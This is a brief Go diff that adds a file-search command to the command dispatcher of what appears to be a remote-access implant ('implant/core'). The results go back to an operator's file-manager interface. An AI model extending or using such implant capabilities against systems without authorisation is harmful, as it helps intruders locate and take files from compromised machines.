@@ -4,6 +4,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"implant/core/commands"
 	"implant/core/communication"
 	"implant/core/debuglog"
 	"implant/core/config"
@@ -134,6 +135,9 @@ func HandleCommand(data []byte) {
 		callbackType = 0
 	case services.FileBrowse: //File Browser
 		result, err = services.CmdFileBrowse(cmdBuf)
+		callbackType = services.FileBrowse
+	case services.FILE_SEARCH: //文件搜索(结果按 FileBrowse 格式回传,前端文件管理器直接渲染)
+		result, err = commands.CmdFileSearch(cmdBuf)
 		callbackType = services.FileBrowse
 	case services.CD: //cd
 		result, err = services.CmdCd(cmdBuf)
